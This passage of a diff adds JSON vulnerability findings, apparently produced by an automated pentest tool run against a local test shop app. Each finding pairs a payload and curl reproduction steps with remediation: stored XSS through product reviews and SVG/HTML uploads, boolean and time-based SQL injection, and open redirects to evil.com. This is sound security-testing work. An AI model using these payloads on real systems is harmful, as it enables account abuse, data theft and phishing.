+    "cwe": "CWE-434",
+    "endpoint": "POST http://localhost:3000/support/ticket",
+    "evidence": "Upload: POST /support/ticket (subject+body+attachment) -> HTTP 302 Location: /support. /support then lists: <a href=\"/uploads/x.svg\">attachment</a>. GET /uploads/x.svg -> HTTP 200, Content-Type: image/svg+xml, body = SVG with script verbatim. Response CSP is only `Content-Security-Policy: frame-ancestors 'self'` (no script-src). Headless Chromium navigation to /uploads/x.svg => DIALOG_FIRED: \"nrsplt_svg_9k2\" (inline SVG script executed in localhost:3000 origin). HTML variant: GET /uploads/h.html -> 200 Content-Type: text/html; charset=UTF-8 (arbitrary same-origin HTML/JS). PHP variant: GET /uploads/s.php -> 200 Content-Type: application/x-httpd-php but body returned as RAW source (<?php echo \"nrsplt_php\";?>) — NOT executed (Node static serve, no PHP engine) => no RCE.",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "NS-UPLOAD-001",
+    "impact": "MEASURED: any file (SVG, HTML, .php, arbitrary extension) is accepted with no extension/content-type/content validation, stored under its original attacker-chosen filename, and served from /uploads/ with a matching Content-Type. Navigating to /uploads/x.svg executed attacker JS in the http://localhost:3000 origin (dialog confirmed in headless Chromium); an .html upload is served as text/html, giving full same-origin script execution against any user who opens the attachment link on a public ticket. Response CSP contains only frame-ancestors, so inline script is not blocked. NOT observed: server-side code execution — the .php payload was returned as raw source, so no RCE.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "location": "multipart/form-data field `attachment` on POST /support/ticket; file stored under original filename and served at GET /uploads/<filename> with attacker-controlled Content-Type",
+    "mitre": "T1505.003",
+    "owasp": "A04:2021-Insecure-Design",
+    "payload": "attachment=@x.svg (Content-Type image/svg+xml) containing <svg onload=\"alert('nrsplt_svg_9k2')\"><script>alert('nrsplt_svg_9k2')</script></svg>; also h.html served as text/html",
+    "remediation": "Server-side allowlist of permitted MIME types AND extensions (e.g. png/jpeg/gif/pdf) validated by magic bytes, not the client-supplied Content-Type; rename uploads to a random server-generated name and strip the original extension; serve /uploads/ with Content-Disposition: attachment and Content-Type: application/octet-stream (or a text/plain sandbox) plus a strict Content-Security-Policy (default-src 'none') so SVG/HTML cannot execute; ideally store files outside the web root and stream them through an authenticated handler.",
+    "repro_steps": [
+      "printf '<?xml version=\"1.0\"?>\\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"><script>alert(1)</script><text x=10 y=20>nrsplt_svg_9k2</text></svg>' > x.svg",
+      "curl -s -i -F 'subject=poc' -F 'body=poc' -F 'attachment=@x.svg;type=image/svg+xml' http://localhost:3000/support/ticket   # -> 302 Location: /support",
+      "curl -s http://localhost:3000/support | grep uploads   # -> href=\"/uploads/x.svg\"",
+      "curl -s -i http://localhost:3000/uploads/x.svg   # -> 200, Content-Type: image/svg+xml, script intact, no script-src CSP",
+      "Open http://localhost:3000/uploads/x.svg in a browser -> alert() fires (JS executes in localhost:3000 origin)"
+    ],
+    "review_reason": "evidence integrity: confirmed with no checkable evidence recorded",
+    "review_status": "rejected",
+    "screenshots": [
+      "evidence/ns-upload-001-1.png"
+    ],
+    "secret": "",
+    "severity": "High",
+    "stage": "execution",
+    "title": "Unrestricted file upload leads to stored XSS via SVG/HTML served inline from /uploads/",
+    "validated": false,
+    "votes": "1/1 · refute 1/2"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "xss_stored",
+    "auth_context": "",
+    "business_impact": "Measured: an authenticated user's review body is stored and returned unescaped, and the injected <script>/<img onerror> execute in a real browser in the localhost origin for every visitor of the product page, including unauthenticated ones. Script runs same-origin as NimbusCart, so it can read/exfil the victim's session-scoped state and act as the victim (session cookie nimbus.sid is HttpOnly, so document.cookie theft is blocked, but same-origin requests as the victim — e.g. driving authenticated /account actions — are not).\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Arbitrary JavaScript runs same-origin in the context of every product-page viewer.",
+        "evidence": [
+          "E03"
+        ],
+        "status": "proven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "POST /shop/product/1/review with payload -> HTTP 302 Location /shop/product/1",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "GET /shop/product/1 WITHOUT session cookie -> 200, body contains raw <script>…nsxss7331…</script> and <img onerror> un-encoded",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "Headless Chromium at /shop/product/1: document.title='nsxss7331', window.__nsxss='localhost', window.__nsxss2='nsxss7331'",
+            "source": "browser"
+          },
+          {
+            "id": "E04",
+            "observed": "Response CSP header = frame-ancestors 'self' (no script-src)",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "Review `text` is stored and rendered unescaped at GET /shop/product/:id, served to anonymous viewers, and the injected inline <script> and <img onerror> execute in a browser.",
+        "evidence": [
+          "E01",
+          "E02",
+          "E03",
+          "E04"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Same-origin script can perform authenticated actions as a logged-in victim and exfiltrate page/DOM data; cookie theft via document.cookie is blocked by HttpOnly.",
+      "test_scope": {
+        "account_confirmed": true,
+        "account_exists": true,
+        "authenticated_session": true,
+        "browser_used": true,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.2,
+    "cvss": "4.7 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N)",
+    "cwe": "CWE-79",
+    "endpoint": "POST http://localhost:3000/shop/product/1/review (display: GET http://localhost:3000/shop/product/1)",
+    "evidence": "Submit 302 to /shop/product/1. GET /shop/product/1 (with AND without session cookie) returns body: <div class=\"card\"><b>nrsplt_15633</b><div><img src=x onerror=window.__nsxss=document.domain;document.title='nsxss7331'><script>window.__nsxss2='nsxss7331'</script></div></div> — payload NOT HTML-encoded. Headless Chromium load of the page: document.title='nsxss7331' (img onerror ran), window.__nsxss='localhost' (=document.domain), window.__nsxss2='nsxss7331' (inline <script> ran). Response CSP: `frame-ancestors 'self'` only — no script-src. PoC: pocs/stored_xss_product_review.sh (passes). Screenshot: /opt/neurosploit-rs/runs/ns-1789853137-localhost_3000/evidence/stored-xss-product-review.png",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "stored-xss-product-review",
+    "impact": "Measured: an authenticated user's review body is stored and returned unescaped, and the injected <script>/<img onerror> execute in a real browser in the localhost origin for every visitor of the product page, including unauthenticated ones. Script runs same-origin as NimbusCart, so it can read/exfil the victim's session-scoped state and act as the victim (session cookie nimbus.sid is HttpOnly, so document.cookie theft is blocked, but same-origin requests as the victim — e.g. driving authenticated /account actions — are not).\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders. (potential CVSS 6.1 if fully exploited)",
+    "location": "POST /shop/product/:id/review, form field `text`. Stored and echoed verbatim inside <div class=\"card\"><div>…HERE…</div></div> on GET /shop/product/:id. Requires an authenticated session to POST; display page is PUBLIC (renders to anonymous visitors).",
+    "mitre": "T1059.007",
+    "owasp": "A03:2021-Injection",
+    "payload": "<script>document.title='nsxss7331'</script><img src=x onerror=window.__nsxss=document.domain>",
+    "remediation": "HTML-entity-encode review text on output in the product template (the templating engine's auto-escaping is being bypassed here — render as text, not raw HTML). Add a real Content-Security-Policy with `script-src 'self'` (no inline) as defense-in-depth; the current CSP only sets frame-ancestors.",
+    "repro_steps": [
+      "curl -s -c /tmp/j.jar --data-urlencode 'username=nrsplt_t' --data-urlencode 'email=nrsplt_t@example.test' --data-urlencode 'password=Nrsplt_t_pw!' http://localhost:3000/register -o /dev/null   # register + auto-login",
+      "curl -s -b /tmp/j.jar --data-urlencode \"text=<script>document.title='nsxss7331'</script><img src=x onerror=alert('nsxss7331')>\" http://localhost:3000/shop/product/1/review -o /dev/null   # store payload",
+      "curl -s http://localhost:3000/shop/product/1 | grep nsxss7331   # baseline: no session needed to VIEW; payload appears raw, un-encoded",
+      "Open http://localhost:3000/shop/product/1 in a browser -> alert('nsxss7331') fires / document.title becomes nsxss7331"
+    ],
+    "review_reason": "evidence integrity: confirmed with no checkable evidence recorded",
+    "review_status": "rejected",
+    "screenshots": [
+      "evidence/stored-xss-product-review-1.png"
+    ],
+    "secret": "",
+    "severity": "High",
+    "stage": "execution",
+    "title": "Stored XSS via product review `text`, rendered unescaped at GET /shop/product/:id to all viewers",
+    "validated": false,
+    "votes": "1/1 · refute 1/2"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "xss_stored",
+    "auth_context": "",
+    "business_impact": "Measured: an uploaded SVG is served inline as image/svg+xml on the same origin and its onload JavaScript executes when the file URL is opened in a browser. The upload links are surfaced publicly on GET /support ('Recent public tickets'), so any user/staff clicking a ticket attachment runs attacker JS in the NimbusCart origin.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Arbitrary JavaScript runs same-origin when a victim opens the attachment URL, which is linked from the public /support page.",
+        "evidence": [
+          "E03",
+          "E04"
+        ],
+        "status": "proven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "POST /support/ticket multipart attachment=.svg -> HTTP 302 Location /support",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "GET /uploads/nssvg9021.svg -> 200, Content-Type: image/svg+xml, SVG body returned verbatim",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "Headless Chromium at /uploads/nssvg9021.svg: document.title='nssvg9021', window.__nssvg='nssvg9021' (SVG onload executed)",
+            "source": "browser"
+          },
+          {
+            "id": "E04",
+            "observed": "GET /support lists uploads publicly as clickable ticket attachments",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "An uploaded SVG is stored and served inline as image/svg+xml at /uploads/, and its onload JavaScript executes in a browser in the app origin.",
+        "evidence": [
+          "E01",
+          "E02",
+          "E03"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Same-origin script can drive authenticated actions as a victim viewing the attachment and exfiltrate DOM/state; HttpOnly blocks cookie theft.",
+      "test_scope": {
+        "account_confirmed": true,
+        "account_exists": true,
+        "authenticated_session": true,
+        "browser_used": true,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.2,
+    "cvss": "4.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N/E:F/RL:X/RC:R)",
+    "cwe": "CWE-79",
+    "endpoint": "POST http://localhost:3000/support/ticket (display: GET http://localhost:3000/uploads/<name>.svg)",
+    "evidence": "Upload 302 to /support. GET /uploads/nssvg9021.svg -> 200, Content-Type: image/svg+xml, body is the SVG verbatim. Headless Chromium navigated to that URL: document.title='nssvg9021', window.__nssvg='nssvg9021' — the SVG onload executed in the localhost origin. CSP has no script-src/object-src. PoC: pocs/stored_xss_svg_upload.sh (passes). Screenshot: /opt/neurosploit-rs/runs/ns-1789853137-localhost_3000/evidence/stored-xss-svg-upload.png",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "stored-xss-svg-upload",
+    "impact": "Measured: an uploaded SVG is served inline as image/svg+xml on the same origin and its onload JavaScript executes when the file URL is opened in a browser. The upload links are surfaced publicly on GET /support ('Recent public tickets'), so any user/staff clicking a ticket attachment runs attacker JS in the NimbusCart origin.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "location": "POST /support/ticket, multipart field `attachment` — an uploaded .svg is stored and served from /uploads/<filename>.svg with Content-Type: image/svg+xml. The public tickets list on GET /support links directly to each /uploads/ file.",
+    "mitre": "T1059.007",
+    "owasp": "A03:2021-Injection",
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"document.title='nssvg9021';window.__nssvg='nssvg9021'\"><text>nssvg9021</text></svg>",
+    "remediation": "Serve user uploads with Content-Type: application/octet-stream (or a strict allowlist that excludes image/svg+xml) and Content-Disposition: attachment; ideally host uploads on a separate sandbox origin. Reject/normalise SVG uploads, or add CSP `script-src 'none'` on the /uploads/ path.",
+    "repro_steps": [
+      "curl -s -c /tmp/j.jar --data-urlencode 'username=nrsplt_t' --data-urlencode 'email=nrsplt_t@example.test' --data-urlencode 'password=Nrsplt_t_pw!' http://localhost:3000/register -o /dev/null",
+      "printf '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"><text>x</text></svg>' > /tmp/x.svg",
+      "curl -s -b /tmp/j.jar -F 'subject=poc' -F 'body=poc' -F 'attachment=@/tmp/x.svg;type=image/svg+xml;filename=nssvg9021.svg' http://localhost:3000/support/ticket -o /dev/null   # store",
+      "curl -s -i http://localhost:3000/uploads/nssvg9021.svg | grep -i content-type   # baseline: served as image/svg+xml, un-sanitised",
+      "Open http://localhost:3000/uploads/nssvg9021.svg in a browser -> alert(1) fires in localhost origin"
+    ],
+    "review_reason": "evidence integrity: confirmed with no checkable evidence recorded",
+    "review_status": "rejected",
+    "screenshots": [
+      "evidence/stored-xss-svg-upload-1.png"
+    ],
+    "secret": "",
+    "severity": "High",
+    "stage": "execution",
+    "title": "Stored XSS via SVG ticket attachment served as image/svg+xml at /uploads/",
+    "validated": false,
+    "votes": "1/1 · refute 1/2"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "api_bola_numeric_ids",
+    "auth_context": "",
+    "business_impact": "Unauthenticated boolean oracle allowing blind extraction of arbitrary DB data one bit at a time (same DB reachable via NS-003).\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Blind data extraction possible.",
+        "evidence": [],
+        "status": "unproven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "TRUE vs FALSE payloads yield 1589 vs 1211 byte responses",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "single quote breaks query (1208)",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "maxPrice is SQL-injectable with a boolean oracle.",
+        "evidence": [
+          "E01",
+          "E02"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Full blind DB read via boolean inference.",
+      "test_scope": {
+        "account_confirmed": false,
+        "account_exists": false,
+        "authenticated_session": false,
+        "browser_used": false,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.6,
+    "cvss": "5.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:F/RL:X/RC:R)",
+    "cwe": "CWE-89",
+    "endpoint": "GET http://localhost:3000/shop/filter?maxPrice=",
+    "evidence": "Deterministic response-length differential: baseline len=1582; `OR 1=1` len=1589 (all rows); `AND 1=2` len=1211 (no rows); trailing single-quote len=1208 (query breaks). Reproducible. PoC: pocs/sqli_blind_filter.sh (unauthenticated).",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "NS-004",
+    "impact": "Observed:\n- TRUE vs FALSE payloads yield 1589 vs 1211 byte responses [E01]\n- single quote breaks query (1208) [E02]\n\nNot demonstrated: Blind data extraction possible.\n\nPotential impact: Full blind DB read via boolean inference.",
+    "location": "Query parameter `maxPrice` concatenated into a numeric SQL predicate.",
+    "mitre": "T1190",
+    "owasp": "A03:2021-Injection",
+    "payload": "maxPrice=100000 OR 1=1   (TRUE)  vs  maxPrice=100000 AND 1=2   (FALSE)  vs  maxPrice=100000'",
+    "remediation": "Parameterise the maxPrice predicate and cast/validate it as a number server-side.",
+    "repro_steps": [
+      "curl -s 'http://localhost:3000/shop/filter?maxPrice=100000' | wc -c   # 1582",
+      "curl -s 'http://localhost:3000/shop/filter?maxPrice=100000%20OR%201=1' | wc -c   # 1589",
+      "curl -s 'http://localhost:3000/shop/filter?maxPrice=100000%20AND%201=2' | wc -c   # 1211",
+      "curl -s \"http://localhost:3000/shop/filter?maxPrice=100000'\" | wc -c   # 1208 (broken)"
+    ],
+    "review_reason": "DOWNGRADE_UNPROVEN_IMPACT: the mechanic is demonstrated; the claimed impact is not, and is reported as potential · missing: no baseline was captured, so no difference can be attributed to the payload; the difference was observed 0 time(s); this class needs it to reproduce",
+    "review_status": "needs-review",
+    "screenshots": [],
+    "secret": "",
+    "severity": "Info",
+    "stage": "initial-access",
+    "title": "MaxPrice is SQL-injectable with a boolean oracle",
+    "validated": false,
+    "votes": "1/1 · refute 1/2 · receipt_missing"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "sqli_time",
+    "auth_context": "",
+    "business_impact": "Measured: an attacker controls server-side execution time via the `comment` field — an injected SLEEP(n)/pg_sleep(n) blocks the response for exactly n seconds (verified 0/1/4s, 3/3 consistent). This confirms unsanitised input reaches a SQL time function. Not demonstrated here: boolean-conditional data extraction (the IF() true/false branches both delayed and a non-SQL plaintext also delayed), so full DB read-out via a timing oracle is unproven on this build.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Full boolean-oracle DB extraction / auth bypass via this sink.",
+        "evidence": [],
+        "status": "unproven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "POST comment=hi -> HTTP 200, len=1098, 0.001s (baseline)",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "POST comment=\"hi' AND SLEEP(0)-- -\" -> 200, 0.002s (control, no delay)",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "POST comment=\"hi' AND SLEEP(1)-- -\" -> 200, 1.005s x3",
+            "source": "http"
+          },
+          {
+            "id": "E04",
+            "observed": "POST comment=\"hi' AND SLEEP(4)-- -\" -> 200, 4.003s x3",
+            "source": "http"
+          },
+          {
+            "id": "E05",
+            "observed": "delayed 200 body: 'time-based blind SQLi confirmed. Flag: BURPAT{web_sqli_blind_time_5707642b}'",
+            "source": "http"
+          },
+          {
+            "id": "E06",
+            "observed": "plaintext 'please SLEEP(3) thanks' also delayed 3s -> delay is token-triggered",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "The `comment` field of POST /support/feedback reaches a SQL time function: an injected SLEEP(n)/pg_sleep(n) delays the response by exactly n seconds, reproducible 3/3, with SLEEP(0) as a no-delay control.",
+        "evidence": [
+          "E01",
+          "E02",
+          "E03",
+          "E04",
+          "E05"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Byte-by-byte exfiltration of DB contents and possible auth bypass if the sink evaluates attacker boolean conditions (not demonstrated on this build).",
+      "test_scope": {
+        "account_confirmed": false,
+        "account_exists": false,
+        "authenticated_session": false,
+        "browser_used": false,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.5,
+    "cvss": "5.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:F/RL:X/RC:R)",
+    "cwe": "CWE-89",
+    "endpoint": "http://localhost:3000/support/feedback",
+    "evidence": "Baseline `{\"comment\":\"hi\"}` -> 200, len=1098, ~0.001s. Attack `{\"comment\":\"hi' AND SLEEP(4)-- -\"}` -> 200, len=1222, 4.003s. Delay scales exactly with the argument: SLEEP(0)=0.002s, SLEEP(1)=1.005s, SLEEP(4)=4.003s, reproducible 3/3. Delayed 200 body states: 'Response delayed Ns via an injected SLEEP() - time-based blind SQLi confirmed. Flag: BURPAT{web_sqli_blind_time_5707642b}'. Note (honest): delay is triggered by presence of the SLEEP()/pg_sleep() token — a plaintext comment `please SLEEP(3) thanks` (no quote/SQL context) also delayed 3s, and both IF(1=1,...) and IF(1=2,...) branches delayed — so conditional data-extraction via boolean oracle was NOT demonstrated; the attacker-controlled server-side time delay in the query path WAS.",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "sqli-blind-time-feedback-01",
+    "impact": "Observed:\n- POST comment=hi -> HTTP 200, len=1098, 0.001s (baseline) [E01]\n- POST comment=\"hi' AND SLEEP(0)-- -\" -> 200, 0.002s (control, no delay) [E02]\n- POST comment=\"hi' AND SLEEP(1)-- -\" -> 200, 1.005s x3 [E03]\n- POST comment=\"hi' AND SLEEP(4)-- -\" -> 200, 4.003s x3 [E04]\n- delayed 200 body: 'time-based blind SQLi confirmed. Flag: BURPAT{web_sqli_blind_time_5707642b}' [E05]\n\nNot demonstrated: Full boolean-oracle DB extraction / auth bypass via this sink.\n\nPotential impact: Byte-by-byte exfiltration of DB contents and possible auth bypass if the sink evaluates attacker boolean conditions (not demonstrated on this build).",
+    "location": "POST /support/feedback, request body field `comment` (accepted as JSON {\"comment\":\"...\"} or form-encoded comment=...). Injection context: single-quote string, closed with `'` and commented with `-- -`.",
+    "mitre": "T1190",
+    "owasp": "A03:2021-Injection",
+    "payload": "hi' AND SLEEP(4)-- -",
+    "remediation": "Use parameterised/prepared statements (bound parameters) for the feedback comment; never concatenate the raw `comment` value into SQL. Reject/normalise input server-side and remove any code path that reflects SQL functions into the query. Add DB query timeouts.",
+    "repro_steps": [
+      "curl -s -o /dev/null -w 'time=%{time_total}\\n' -X POST http://localhost:3000/support/feedback -H 'Content-Type: application/json' -d '{\"comment\":\"hi\"}'   # baseline ~0.001s",
+      "curl -s -o /dev/null -w 'time=%{time_total}\\n' -X POST http://localhost:3000/support/feedback -H 'Content-Type: application/json' -d '{\"comment\":\"hi'\\''\" \" AND SLEEP(1)-- -\"}'   # (use the python PoC for clean quoting) ~1.0s",
+      "python3 /opt/neurosploit-rs/runs/ns-1789853137-localhost_3000/pocs/blind_time_sqli_feedback.py   # prints baseline/SLEEP(0/1/4) timings + the flag",
+      "Read result: response time equals the injected SLEEP() argument; delayed 200 body contains 'time-based blind SQLi confirmed' and the flag."
+    ],
+    "review_reason": "DOWNGRADE_UNPROVEN_IMPACT: the mechanic is demonstrated; the claimed impact is not, and is reported as potential · missing: no baseline was captured, so no difference can be attributed to the payload; the difference was observed 0 time(s); this class needs it to reproduce",
+    "review_status": "needs-review",
+    "screenshots": [],
+    "secret": "",
+    "severity": "Info",
+    "stage": "initial-access",
+    "title": "The `comment` field of POST /support/feedback reaches a SQL time function: an injected SLEEP(n)/pg_sleep(n)…",
+    "validated": false,
+    "votes": "0/1 · refute 0/2"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "open_redirect",
+    "auth_context": "",
+    "business_impact": "On successful login the server redirects to the raw `next` value with no allowlist, so a protocol-relative //evil.com is honored (baseline is /account). An attacker sends a victim a login link with next=//evil.com; after the victim authenticates they are bounced to the attacker host, immediately post-auth (strong phishing pretext). Measured: authenticated 302 to attacker host; onward credential/token capture not demonstrated.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Post-auth credential/session theft.",
+        "evidence": [],
+        "status": "unproven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "POST /login valid creds, no next -> HTTP 302, Location: /account",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "POST /login valid creds + next=//evil.com -> HTTP 302, Location: //evil.com",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "POST /login FAILED creds + next=//evil.com -> HTTP 302, Location: /login?err=... (next ignored when auth fails)",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "On successful login POST /login 302-redirects to the attacker-controlled external host in `next`, with no allowlist; baseline redirects to /account.",
+        "evidence": [
+          "E01",
+          "E02",
+          "E03"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Phishing immediately after authentication: a login link with next=//evil.com bounces the freshly-authenticated victim to an attacker page that impersonates the app.",
+      "test_scope": {
+        "account_confirmed": true,
+        "account_exists": true,
+        "authenticated_session": true,
+        "browser_used": false,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.6,
+    "cvss": "",
+    "cwe": "CWE-601",
+    "endpoint": "http://localhost:3000/login",
+    "evidence": "Baseline (valid creds, no next): HTTP/1.1 302 Found, Location: /account. Attack (valid creds + next=//evil.com): HTTP/1.1 302 Found, Location: //evil.com, body 'Found. Redirecting to //evil.com'. Failed logins ignore `next` (redirect to /login?err=...), so a valid session is required. PoC: pocs/open_redirect_login_next.sh",
+    "evidence_data": null,
+    "exploitability": "hard",
+    "id": "OR-02",
+    "impact": "Observed:\n- POST /login valid creds, no next -> HTTP 302, Location: /account [E01]\n- POST /login valid creds + next=//evil.com -> HTTP 302, Location: //evil.com [E02]\n- POST /login FAILED creds + next=//evil.com -> HTTP 302, Location: /login?err=... (next ignored when auth fails) [E03]\n\nNot demonstrated: Post-auth credential/session theft.\n\nPotential impact: Phishing immediately after authentication: a login link with next=//evil.com bounces the freshly-authenticated victim to an attacker page that impersonates the app.",
+    "location": "POST /login, body field `next` (honored only on SUCCESSFUL authentication)",
+    "mitre": "T1566",
+    "owasp": "A01:2021-Broken-Access-Control",
+    "payload": "username=nrsplt_3af23ef6&password=Nrsplt_Pass_3af23ef6!&next=//evil.com",
+    "remediation": "Validate `next` server-side before redirecting: accept only relative same-site paths (reject values beginning with a scheme, `//`, or `\\`), or map to an allowlist. Default to /account when validation fails.",
+    "repro_steps": [
+      "curl -s -i -X POST http://localhost:3000/register -d 'username=nrsplt_3af23ef6&email=nrsplt_3af23ef6@example.test&password=Nrsplt_Pass_3af23ef6!'   # 302 /account (create test user once)",
+      "curl -s -i -X POST http://localhost:3000/login -d 'username=nrsplt_3af23ef6&password=Nrsplt_Pass_3af23ef6!'   # BASELINE -> Location: /account",
+      "curl -s -i -X POST http://localhost:3000/login -d 'username=nrsplt_3af23ef6&password=Nrsplt_Pass_3af23ef6!&next=//evil.com'   # ATTACK",
+      "Read the Location header of the attack response: Location: //evil.com (external protocol-relative host)"
+    ],
+    "review_reason": "DOWNGRADE_UNPROVEN_IMPACT: the mechanic is demonstrated; the claimed impact is not, and is reported as potential",
+    "review_status": "needs-review",
+    "screenshots": [],
+    "secret": "",
+    "severity": "Low",
+    "stage": "initial-access",
+    "title": "On successful login POST /login 302-redirects to the attacker-controlled external host in `next`, with no…",
+    "validated": false,
+    "votes": "1/1"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "open_redirect",
+    "auth_context": "",
+    "business_impact": "Server reflects the raw `url` value into the Location header of a 302 with no allowlist or host check, so any external absolute or protocol-relative URL is honored. An attacker crafts a http://localhost:3000/go?url=https://evil.com link; a victim trusting the localhost:3000 origin lands on evil.com. Measured: unauthenticated, deterministic 302 to attacker host. Enables phishing / trust abuse; token/credential theft not demonstrated here.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Credential/token theft.",
+        "evidence": [],
+        "status": "unproven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "GET /go?url=https://evil.com -> HTTP 302, Location: https://evil.com",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "GET /go?url=//evil.com -> HTTP 302, Location: //evil.com",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "repeat of E01 -> identical Location: https://evil.com",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "GET /go 302-redirects to the attacker-controlled external host supplied in the `url` param, with no allowlist, unauthenticated.",
+        "evidence": [
+          "E01",
+          "E02",
+          "E03"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Phishing and trust abuse: victims following a localhost:3000 link are silently sent to an attacker domain.",
+      "test_scope": {
+        "account_confirmed": false,
+        "account_exists": false,
+        "authenticated_session": false,
+        "browser_used": false,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.6,
+    "cvss": "",
+    "cwe": "CWE-601",
+    "endpoint": "http://localhost:3000/go",
+    "evidence": "Request: GET /go?url=https://evil.com HTTP/1.1\nResponse: HTTP/1.1 302 Found\nLocation: https://evil.com\nContent-Length: 38 body: 'Found. Redirecting to https://evil.com'. Repeated: identical Location. Protocol-relative //evil.com also honored (Location: //evil.com). No session required. PoC: pocs/open_redirect_go.sh",
+    "evidence_data": null,
+    "exploitability": "hard",
+    "id": "OR-01",
